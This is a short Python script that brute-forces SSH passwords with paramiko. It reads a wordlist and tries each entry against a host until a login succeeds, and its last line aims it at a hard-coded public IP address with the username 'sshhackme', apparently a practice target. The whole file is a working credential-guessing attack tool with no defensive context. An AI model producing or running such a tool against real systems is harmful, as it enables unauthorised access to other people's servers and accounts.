#ssh_bruteforce
import paramiko

def ssh_bruteforce(host, username, password_file):
    with open(password_file, 'r') as file:
        passwords = file.readlines()
        for password in passwords:
            password=password.strip()
            try:
                print(f"Trying:{password}")
                client=paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(host, username=username, password=password, timeout=3)
                print(f"[+] Password Found:{password}")
                client.close()
                break
            except paramiko.AuthenticationException:
                print(f"[-]Incorrect Password")
            except Exception as e:
                print(f"[!] Error:{e}")

#Run the Brute Force
ssh_bruteforce("52.234.30.228", "sshhackme", "passwords.txt")